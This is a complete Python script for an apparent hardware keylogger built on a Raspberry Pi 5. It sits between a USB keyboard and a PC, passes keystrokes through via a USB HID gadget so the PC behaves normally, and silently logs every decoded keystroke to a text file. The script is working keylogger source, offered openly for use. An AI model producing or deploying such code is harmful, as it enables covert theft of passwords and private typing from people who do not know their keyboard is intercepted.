#!/usr/bin/env python3
"""
PRO3 keylogger / HID passthrough.

Reads keystrokes from an external USB keyboard plugged into the Pi 5,
forwards them to a PC over USB-C via /dev/hidg0 (USB HID gadget), and
appends a decoded log to keystrokes.txt.

Setup: run setup_hid_gadget.sh once and reboot if prompted.
Usage: sudo ./keylogger.py [--device /dev/input/eventX] [--log keystrokes.txt]
"""

import argparse
import os
import sys
import time
from pathlib import Path

from evdev import InputDevice, ecodes, list_devices

HID_DEV = "/dev/hidg0"

# evdev key -> USB HID usage code (boot keyboard)
EVDEV_TO_HID = {
    ecodes.KEY_A: 0x04, ecodes.KEY_B: 0x05, ecodes.KEY_C: 0x06, ecodes.KEY_D: 0x07,
    ecodes.KEY_E: 0x08, ecodes.KEY_F: 0x09, ecodes.KEY_G: 0x0A, ecodes.KEY_H: 0x0B,
    ecodes.KEY_I: 0x0C, ecodes.KEY_J: 0x0D, ecodes.KEY_K: 0x0E, ecodes.KEY_L: 0x0F,
    ecodes.KEY_M: 0x10, ecodes.KEY_N: 0x11, ecodes.KEY_O: 0x12, ecodes.KEY_P: 0x13,
    ecodes.KEY_Q: 0x14, ecodes.KEY_R: 0x15, ecodes.KEY_S: 0x16, ecodes.KEY_T: 0x17,
    ecodes.KEY_U: 0x18, ecodes.KEY_V: 0x19, ecodes.KEY_W: 0x1A, ecodes.KEY_X: 0x1B,
    ecodes.KEY_Y: 0x1C, ecodes.KEY_Z: 0x1D,
    ecodes.KEY_1: 0x1E, ecodes.KEY_2: 0x1F, ecodes.KEY_3: 0x20, ecodes.KEY_4: 0x21,
    ecodes.KEY_5: 0x22, ecodes.KEY_6: 0x23, ecodes.KEY_7: 0x24, ecodes.KEY_8: 0x25,
    ecodes.KEY_9: 0x26, ecodes.KEY_0: 0x27,
    ecodes.KEY_ENTER: 0x28, ecodes.KEY_ESC: 0x29, ecodes.KEY_BACKSPACE: 0x2A,
    ecodes.KEY_TAB: 0x2B, ecodes.KEY_SPACE: 0x2C, ecodes.KEY_MINUS: 0x2D,
    ecodes.KEY_EQUAL: 0x2E, ecodes.KEY_LEFTBRACE: 0x2F, ecodes.KEY_RIGHTBRACE: 0x30,
    ecodes.KEY_BACKSLASH: 0x31, ecodes.KEY_SEMICOLON: 0x33, ecodes.KEY_APOSTROPHE: 0x34,
    ecodes.KEY_GRAVE: 0x35, ecodes.KEY_COMMA: 0x36, ecodes.KEY_DOT: 0x37,
    ecodes.KEY_SLASH: 0x38, ecodes.KEY_CAPSLOCK: 0x39,
    ecodes.KEY_F1: 0x3A, ecodes.KEY_F2: 0x3B, ecodes.KEY_F3: 0x3C, ecodes.KEY_F4: 0x3D,
    ecodes.KEY_F5: 0x3E, ecodes.KEY_F6: 0x3F, ecodes.KEY_F7: 0x40, ecodes.KEY_F8: 0x41,
    ecodes.KEY_F9: 0x42, ecodes.KEY_F10: 0x43, ecodes.KEY_F11: 0x44, ecodes.KEY_F12: 0x45,
    ecodes.KEY_SYSRQ: 0x46, ecodes.KEY_SCROLLLOCK: 0x47, ecodes.KEY_PAUSE: 0x48,
    ecodes.KEY_INSERT: 0x49, ecodes.KEY_HOME: 0x4A, ecodes.KEY_PAGEUP: 0x4B,
    ecodes.KEY_DELETE: 0x4C, ecodes.KEY_END: 0x4D, ecodes.KEY_PAGEDOWN: 0x4E,
    ecodes.KEY_RIGHT: 0x4F, ecodes.KEY_LEFT: 0x50, ecodes.KEY_DOWN: 0x51,
    ecodes.KEY_UP: 0x52, ecodes.KEY_NUMLOCK: 0x53,
    ecodes.KEY_KPSLASH: 0x54, ecodes.KEY_KPASTERISK: 0x55, ecodes.KEY_KPMINUS: 0x56,
    ecodes.KEY_KPPLUS: 0x57, ecodes.KEY_KPENTER: 0x58,
    ecodes.KEY_KP1: 0x59, ecodes.KEY_KP2: 0x5A, ecodes.KEY_KP3: 0x5B, ecodes.KEY_KP4: 0x5C,
    ecodes.KEY_KP5: 0x5D, ecodes.KEY_KP6: 0x5E, ecodes.KEY_KP7: 0x5F, ecodes.KEY_KP8: 0x60,
    ecodes.KEY_KP9: 0x61, ecodes.KEY_KP0: 0x62, ecodes.KEY_KPDOT: 0x63,
}

# Bit in the HID report's modifier byte
MOD_BITS = {
    ecodes.KEY_LEFTCTRL:   0x01,
    ecodes.KEY_LEFTSHIFT:  0x02,
    ecodes.KEY_LEFTALT:    0x04,
    ecodes.KEY_LEFTMETA:   0x08,
    ecodes.KEY_RIGHTCTRL:  0x10,
    ecodes.KEY_RIGHTSHIFT: 0x20,
    ecodes.KEY_RIGHTALT:   0x40,
    ecodes.KEY_RIGHTMETA:  0x80,
}

# US QWERTY base characters
EVDEV_TO_CHAR = {
    ecodes.KEY_A: 'a', ecodes.KEY_B: 'b', ecodes.KEY_C: 'c', ecodes.KEY_D: 'd',
    ecodes.KEY_E: 'e', ecodes.KEY_F: 'f', ecodes.KEY_G: 'g', ecodes.KEY_H: 'h',
    ecodes.KEY_I: 'i', ecodes.KEY_J: 'j', ecodes.KEY_K: 'k', ecodes.KEY_L: 'l',
    ecodes.KEY_M: 'm', ecodes.KEY_N: 'n', ecodes.KEY_O: 'o', ecodes.KEY_P: 'p',
    ecodes.KEY_Q: 'q', ecodes.KEY_R: 'r', ecodes.KEY_S: 's', ecodes.KEY_T: 't',
    ecodes.KEY_U: 'u', ecodes.KEY_V: 'v', ecodes.KEY_W: 'w', ecodes.KEY_X: 'x',
    ecodes.KEY_Y: 'y', ecodes.KEY_Z: 'z',
    ecodes.KEY_1: '1', ecodes.KEY_2: '2', ecodes.KEY_3: '3', ecodes.KEY_4: '4',
    ecodes.KEY_5: '5', ecodes.KEY_6: '6', ecodes.KEY_7: '7', ecodes.KEY_8: '8',
    ecodes.KEY_9: '9', ecodes.KEY_0: '0',
    ecodes.KEY_MINUS: '-', ecodes.KEY_EQUAL: '=',
    ecodes.KEY_LEFTBRACE: '[', ecodes.KEY_RIGHTBRACE: ']', ecodes.KEY_BACKSLASH: '\\',
    ecodes.KEY_SEMICOLON: ';', ecodes.KEY_APOSTROPHE: "'", ecodes.KEY_GRAVE: '`',
    ecodes.KEY_COMMA: ',', ecodes.KEY_DOT: '.', ecodes.KEY_SLASH: '/',
    ecodes.KEY_SPACE: ' ',
}

EVDEV_SHIFT = {
    ecodes.KEY_1: '!', ecodes.KEY_2: '@', ecodes.KEY_3: '#', ecodes.KEY_4: '$',
    ecodes.KEY_5: '%', ecodes.KEY_6: '^', ecodes.KEY_7: '&', ecodes.KEY_8: '*',
    ecodes.KEY_9: '(', ecodes.KEY_0: ')',
    ecodes.KEY_MINUS: '_', ecodes.KEY_EQUAL: '+',
    ecodes.KEY_LEFTBRACE: '{', ecodes.KEY_RIGHTBRACE: '}', ecodes.KEY_BACKSLASH: '|',
    ecodes.KEY_SEMICOLON: ':', ecodes.KEY_APOSTROPHE: '"', ecodes.KEY_GRAVE: '~',
    ecodes.KEY_COMMA: '<', ecodes.KEY_DOT: '>', ecodes.KEY_SLASH: '?',
}

SPECIAL_NAMES = {
    ecodes.KEY_ENTER: 'Enter', ecodes.KEY_ESC: 'Esc', ecodes.KEY_BACKSPACE: 'Backspace',
    ecodes.KEY_TAB: 'Tab', ecodes.KEY_CAPSLOCK: 'CapsLock',
    ecodes.KEY_F1: 'F1', ecodes.KEY_F2: 'F2', ecodes.KEY_F3: 'F3', ecodes.KEY_F4: 'F4',
    ecodes.KEY_F5: 'F5', ecodes.KEY_F6: 'F6', ecodes.KEY_F7: 'F7', ecodes.KEY_F8: 'F8',
    ecodes.KEY_F9: 'F9', ecodes.KEY_F10: 'F10', ecodes.KEY_F11: 'F11', ecodes.KEY_F12: 'F12',
    ecodes.KEY_INSERT: 'Ins', ecodes.KEY_HOME: 'Home', ecodes.KEY_PAGEUP: 'PgUp',
    ecodes.KEY_DELETE: 'Del', ecodes.KEY_END: 'End', ecodes.KEY_PAGEDOWN: 'PgDn',
    ecodes.KEY_RIGHT: 'Right', ecodes.KEY_LEFT: 'Left', ecodes.KEY_DOWN: 'Down',
    ecodes.KEY_UP: 'Up', ecodes.KEY_SYSRQ: 'PrintScr',
    ecodes.KEY_SCROLLLOCK: 'ScrollLock', ecodes.KEY_PAUSE: 'Pause',
    ecodes.KEY_NUMLOCK: 'NumLock',
}


def find_keyboard():
    """First evdev device that has letter keys — i.e. a real keyboard."""
    for path in list_devices():
        try:
            dev = InputDevice(path)
            caps = dev.capabilities().get(ecodes.EV_KEY, [])
            if ecodes.KEY_A in caps and ecodes.KEY_Z in caps and ecodes.KEY_SPACE in caps:
                return dev
            dev.close()
        except Exception:
            pass
    return None


def decode(key, mods_down, caps_lock=False):
    """Render a key-press as the string to append to the log."""
    shift = ecodes.KEY_LEFTSHIFT in mods_down or ecodes.KEY_RIGHTSHIFT in mods_down
    ctrl  = ecodes.KEY_LEFTCTRL  in mods_down or ecodes.KEY_RIGHTCTRL  in mods_down
    alt   = ecodes.KEY_LEFTALT   in mods_down or ecodes.KEY_RIGHTALT   in mods_down
    meta  = ecodes.KEY_LEFTMETA  in mods_down or ecodes.KEY_RIGHTMETA  in mods_down

    combo = []
    if ctrl: combo.append('Ctrl')
    if alt:  combo.append('Alt')
    if meta: combo.append('Meta')

    if key in EVDEV_TO_CHAR:
        base = EVDEV_TO_CHAR[key]
        is_letter = 'a' <= base <= 'z'
        # CapsLock inverts shift for letters only; shift+CapsLock = lowercase
        effective_shift = (shift ^ caps_lock) if is_letter else shift
        if effective_shift and key in EVDEV_SHIFT:
            ch = EVDEV_SHIFT[key]
        elif effective_shift and is_letter:
            ch = base.upper()
        else:
            ch = base
        return f"[{'+'.join(combo + [ch])}]" if combo else ch

    if key in SPECIAL_NAMES:
        name = SPECIAL_NAMES[key]
        if shift and not combo:
            combo.append('Shift')
        return f"[{'+'.join(combo + [name])}]" if combo else f"[{name}]"

    return ""


def build_report(mods_down, keys_down):
    """Pack state into an 8-byte boot-keyboard HID report."""
    mod_byte = 0
    for k in mods_down:
        mod_byte |= MOD_BITS.get(k, 0)
    codes = [EVDEV_TO_HID[k] for k in keys_down if k in EVDEV_TO_HID][:6]
    codes += [0] * (6 - len(codes))
    return bytes([mod_byte, 0] + codes)


def run(device_path, log_path):
    dev = InputDevice(device_path) if device_path else find_keyboard()
    if dev is None:
        sys.exit("No keyboard found. Plug one into the Pi's USB-A port.")

    log = open(log_path, 'a', buffering=1)
    hid = open(HID_DEV, 'wb', buffering=0)

    dev.grab()
    print(f"Grabbing {dev.path} ({dev.name}). Logging to {log_path}.", file=sys.stderr)

    mods_down = set()
    keys_down = []
    caps_lock = False

    try:
        for ev in dev.read_loop():
            if ev.type != ecodes.EV_KEY or ev.value == 2:
                # ev.value == 2 is auto-repeat from the kernel; the USB host
                # handles repeat itself, so we don't forward or re-log.
                continue

            key, pressed = ev.code, ev.value
            is_mod = key in MOD_BITS

            if pressed == 1:
                if key == ecodes.KEY_CAPSLOCK:
                    caps_lock = not caps_lock
                if is_mod:
                    mods_down.add(key)
                else:
                    if key not in keys_down:
                        keys_down.append(key)
                    text = decode(key, mods_down, caps_lock)
                    if text:
                        log.write(text)
                        if key == ecodes.KEY_ENTER:
                            log.write('\n')
                        log.flush()
            else:  # pressed == 0
                if is_mod:
                    mods_down.discard(key)
                elif key in keys_down:
                    keys_down.remove(key)

            try:
                hid.write(build_report(mods_down, keys_down))
            except OSError as e:
                print(f"HID write failed ({e}). PC unplugged?", file=sys.stderr)
    finally:
        try:
            dev.ungrab()
        except Exception:
            pass
        hid.close()
        log.close()


def main():
    p = argparse.ArgumentParser(description="PRO3 keylogger / HID passthrough")
    p.add_argument('--device', help='evdev device path (default: auto-detect)')
    p.add_argument('--log', default='keystrokes.txt', help='log file (default: keystrokes.txt)')
    args = p.parse_args()

    if os.geteuid() != 0:
        sys.exit("Run as root: needs evdev grab and /dev/hidg0 write access.")
    if not Path(HID_DEV).exists():
        sys.exit(f"{HID_DEV} not found. Run setup_hid_gadget.sh first (and reboot if it asked).")

    while True:
        try:
            run(args.device, args.log)
        except KeyboardInterrupt:
            return
        except OSError as e:
            print(f"Device error: {e}. Reopening in 2s...", file=sys.stderr)
            time.sleep(2)


if __name__ == '__main__':
    main()
